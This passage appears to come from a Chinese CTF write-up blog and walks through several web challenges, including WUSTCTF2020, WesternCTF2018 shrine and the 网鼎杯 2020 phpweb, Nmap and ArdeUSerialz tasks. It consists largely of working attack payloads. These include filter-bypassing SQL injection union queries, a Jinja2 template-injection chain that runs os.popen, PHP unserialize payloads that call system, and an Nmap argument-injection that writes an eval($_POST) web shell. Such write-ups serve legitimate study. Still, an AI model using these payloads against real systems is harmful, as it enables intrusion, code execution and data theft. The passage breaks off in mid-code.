<p>发现 <code>#-or</code>会被waf，空格会被过滤，于是用<code>/**/</code>代替空格，在union select中闭合后面的单引号。</p>
<p>看看有多少列</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>&#x27; union select <span class="number">1</span>,<span class="number">1</span>...<span class="number">1</span>,<span class="number">1</span>,&#x27;<span class="number">1</span> </span><br></pre></td></tr></table></figure>

<p>一度怀疑自己方法有问题，结果它TM有22列。第2、3位可以显示。由于or被过滤，没办法使用informationschema，查一下版本，MariaDB，可以使用mysql.innodb_table_stats，查到表名</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>&#x27;/**/union/**/select/**/<span class="number">1</span>,@@version,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,&#x27;<span class="number">22</span></span><br><span class="line"><span class="attribute">a</span>&#x27;/**/union/**/select/**/<span class="number">1</span>,(select group_concat(table_name) from mysql.innodb_table_stats),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,&#x27;<span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有FLAG_TABLE,news,users,gtid_slave_pos,ads,users几个表，接下来无列名注入。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>&#x27;/**/union/**/select/**/<span class="number">1</span>,(select/**/group_concat(c)/**/from/**/(select/**/<span class="number">1</span>/**/a,<span class="number">2</span>/**/b,<span class="number">3</span>/**/c/**/union/**/select/**/*/**/from/**/users)d),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,&#x27;<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>需要一个一个试出每个表有多少列。</p>
<h4 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h4><p>intval 对于指数表示只会返回e前的内容。</p>
<p>md5 传入一个 0e215962017，md5后还是一个0e开头的数字，可以相等。</p>
<p>get_flag 先用 ls 看一下目录，找到flag，%09代替空格，ca\t代替cat</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t%<span class="number">09f</span>llllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<h4 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h4><p>服务端模板注入（SSTI），有工具 tqlmap，类似于sqlmap。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name_<span class="number">_</span>)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file_<span class="number">_</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span></span><span class="symbol">:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span></span><span class="symbol">:</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">&#x27;__main__&#x27;</span><span class="symbol">:</span></span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>访问<code>/shrine/&#123;&#123;1+1&#125;&#125;</code>，得到2，可以模板注入。源码中flag在config里，如果没有过滤可以用<code>&#123;&#123;config&#125;&#125;</code>直接获取，但是这里设置了黑名单并且过滤了括号。</p>
<p>但python有一些内置函数，比如<code>url_for</code>和<code>get_flashed_messages</code>，可用payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__&#125;&#125; <span class="comment"># 得到current_app</span></span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125; <span class="comment"># 与上面类似</span></span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="symbol">%25</span> for <span class="keyword">c</span> in [].__class__.__base__.__subclasses__() <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A&#123;<span class="symbol">%25</span> if <span class="keyword">c</span>.__name__ <span class="symbol">%3</span>D<span class="symbol">%3</span>D &#x27;catch_warnings&#x27; <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A<span class="symbol">%20</span> &#123;<span class="symbol">%25</span> for b in <span class="keyword">c</span>.__init__.__globals__.values() <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A<span class="symbol">%20</span> &#123;<span class="symbol">%25</span> if b.__class__ <span class="symbol">%3</span>D<span class="symbol">%3</span>D &#123;&#125;.__class__ <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A<span class="symbol">%20</span><span class="symbol">%20</span><span class="symbol">%20</span> &#123;<span class="symbol">%25</span> if &#x27;eval&#x27; in b.keys() <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A<span class="symbol">%20</span><span class="symbol">%20</span><span class="symbol">%20</span><span class="symbol">%20</span><span class="symbol">%20</span> &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()&#x27;) &#125;&#125;<span class="symbol">%0</span>A<span class="symbol">%20</span><span class="symbol">%20</span><span class="symbol">%20</span> &#123;<span class="symbol">%25</span> endif <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A<span class="symbol">%20</span> &#123;<span class="symbol">%25</span> endif <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A<span class="symbol">%20</span> &#123;<span class="symbol">%25</span> endfor <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A&#123;<span class="symbol">%25</span> endif <span class="symbol">%25</span>&#125;<span class="symbol">%0</span>A&#123;<span class="symbol">%25</span> endfor <span class="symbol">%25</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h4><p>F12看一下有个隐藏的表单，会自动提交。警告信息显示是执行了 func 这个函数，把 p 当作参数。尝试了几个命令执行函数都被 ban 了。</p>
<p>读一下源码</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="constructor">_get_contents(<span class="params">index</span>.<span class="params">php</span>)</span></span><br></pre></td></tr></table></figure>

<p>index.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>把 func 转换成小写，然后检查 ，不能在 disable func 里。<code>func(p)_</code>返回的结果必须是字符串（其实不重要）。</p>
<p>里面给出了一个类，有 destruct方法，可以反序列化绕过 disable func 的限制。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;exec&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$s = serialize($a);</span><br><span class="line">unserialize($s);</span><br></pre></td></tr></table></figure>

<p>验证可以执行命令，buu 的环境中 exec ls 只能看见 <code>/var/www/html</code>这一串目录，尝试用 system。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">func</span>=unserialize&amp;p=O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;find / -name flag*&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>找到 flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">func</span>=unserialize&amp;p=O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h4><p>类似于 Online Tools，应用了 escapeshellarg()+escapeshellcmd()，导致逃逸。</p>
<p>两种方法</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">127.0.0.1&#x27; -iL /flag -oN flag.txt &#x27; # 利用 nmap 参数， -iL 从指定文件读取主机/IP 进行扫描，-oN 将扫描结果写入指定文件</span></span><br><span class="line"><span class="xml">&#x27; </span><span class="php"><span class="meta">&lt;?=</span> @<span class="keyword">eval</span>($_POST[<span class="string">&quot;pd&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG pd.phtml &#x27; # 写入 shell ，由于过滤了 php ，使用 </span><span class="php"><span class="meta">&lt;?=</span> 和 phtml 进行绕过</span></span><br></pre></td></tr></table></figure>

<h4 id="网鼎杯-2020-青龙组-ArdeUSerialz"><a href="#网鼎杯-2020-青龙组-ArdeUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]ArdeUSerialz"></a>[网鼎杯 2020 青龙组]ArdeUSerialz</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化，process 中需要使 op 为 2，然后在 read 中读取 flag.php。所以需要把 op 改成 2，filename 改成 flag.php。</p>
<p>记录一下，private 成员序列化的格式为 <code>%00ClassName%00Attribute</code>，protected 成员格式为<code>%00*%00Attribute</code>。正常 payload</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:11</span><span class="selector-pseudo">:&quot;FileHandler&quot;</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">&quot;%00*%00op&quot;</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">&quot;%00*%00filename&quot;</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">&quot;%00*%00content&quot;</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>会使用<code>===</code>判断 op 是否为 <code>&quot;2&quot;</code>，可以利用弱类型特性，传入数字 2.</p>
<p>由于使用了<code>%00</code>，不能通过 <code>is_valid</code>，将序列化后的字符串中的 <code>s</code>改为<code>S</code>，后面的字符串就可以使用 16 进制表示。</p>
<p>执行<code>__destruct()</code>时，目录不再是该文件位置（？），所以需要使用绝对路径读取文件。可以通过读取 <code>/proc/self/cmdlie</code>获取配置文件路径，在配置文件中得到 web 绝对路径。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = serialize(<span class="keyword">new</span> FileHandler);</span><br><span class="line">$a = str_replace(chr(<span class="number">0</span>),<span class="string">&#x27;\00&#x27;</span>,$a);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;s:&#x27;</span>,<span 